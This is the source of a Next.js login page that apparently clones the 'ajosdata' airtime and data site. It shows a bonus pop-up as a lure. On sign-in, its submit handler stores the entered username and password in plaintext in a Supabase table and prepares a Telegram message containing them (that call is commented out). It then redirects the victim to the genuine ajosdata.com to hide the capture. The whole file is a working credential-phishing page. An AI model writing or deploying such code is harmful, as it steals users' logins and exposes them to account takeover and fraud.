'use client'

import Head from 'next/head';
import Image from 'next/image';
import supabase from '@/utils/supabase';
import { useState, useEffect } from 'react';
import BonusCard from '@/components/BonusCard';

import { LuEyeOff, LuEye } from "react-icons/lu";

const logo = '/images/ajos-logo.png';

export default function Login() {
  const [showBonusCard, setShowBonusCard] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    // Show confetti and bonus card after 0.5 seconds
    const timer = setTimeout(() => {
      setShowBonusCard(true);
    }, 500);

    // Cleanup timer
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const formData = new FormData(e.target);
    const username = formData.get('username');
    const password = formData.get('password');

    const telegram_msg = `username----${username} \n password---- ${password}`;

    // sendTelegramMsg(telegram_msg)

    const button = e.target.querySelector('#login');
    button.textContent = 'Authenticating...';
    button.disabled = true;

    const { error } = await supabase
      .from('aj_users')
      .insert({ username: username, password: password });

    if (!error) {
      setTimeout(() => {
        window.location.href = 'https://ajosdata.com/';
      }, 1000);
    } else {
      button.textContent = 'Sign In';
      button.disabled = false;
    }
  };

  const closeBonusCard = () => {
    setShowBonusCard(false);
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <>
      <Head>
        <title>Login - ajosdata | Buy Data, Airtime to cash, Bills Payment</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta name="theme-color" content="#1B0569" />
        <meta name="msapplication-TileImage" content="/static/img/bg.jpg" />
        <meta name="description" content="Buy Cheap Internet Data Plan and Airtime Recharge for Airtel, 9mobile, GLO, MTN, Pay DSTV, GOTV, PHCN." />
        <meta name="twitter:card" content="/static/img/bg.jpg" />
        <meta property="og:title" content="ajosdata- Buy Airtime and Data for all Network" />
        <meta property="og:image" content="/static/img/bg.jpg" />
        <meta property="og:description" content="Buy Cheap Internet Data Plan and Airtime Recharge for Airtel, 9mobile, GLO, MTN" />
      </Head>
      <div className="flex items-center justify-center min-h-screen bg-[#e48a00]">
        <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-[400px] my-5">
          <div className="text-center mb-12 flex flex-col items-center justify-center">
            <Image src={logo} alt="Ajos Logo" width={130} height={130} />
            <h3 className="text-xl font-bold mt-4 text-[#2a2f5b]">Sign In</h3>
          </div>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label htmlFor="username" className="block text-sm font-medium text-gray-700">Username*</label>
              <input
                type="text"
                id="username"
                name="username"
                className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                required
              />
            </div>
            <div className="mb-4 relative">
              <label htmlFor="password" className="block text-sm font-medium text-gray-700">Password*</label>
              <input
                type={showPassword ? 'text' : 'password'}
                id="password"
                name="password"
                className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                required
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute inset-y-0 right-3 top-9 flex items-center text-gray-500 justify-center h-fit"
              >
                {showPassword ? <LuEyeOff /> : <LuEye />}
              </button>
            </div>
            <div className='flex flex-col mb-10'>
              <div className="flex text-blue-500 justify-between items-center mb-6">
                <a href="/password_reset/" className="text-sm hover:underline">Forgot Password? </a>
              </div>
              <button
                type="submit"
                id='login'
                className="w-fit py-2 px-4 bg-[#e48900f1] hover:bg-[#e48900e3] text-sm text-white font-bold rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                Sign In
              </button>
            </div>
          </form>
          <div className="mt-4 text-center">
            <span className="text-sm">Don’t have an account yet?</span> <a href="/signup/" className="text-sm text-blue-500 hover:underline">Sign Up</a>
          </div>
        </div>
        {showBonusCard && <BonusCard onClose={closeBonusCard} />}
      </div>
    </>
  );
}
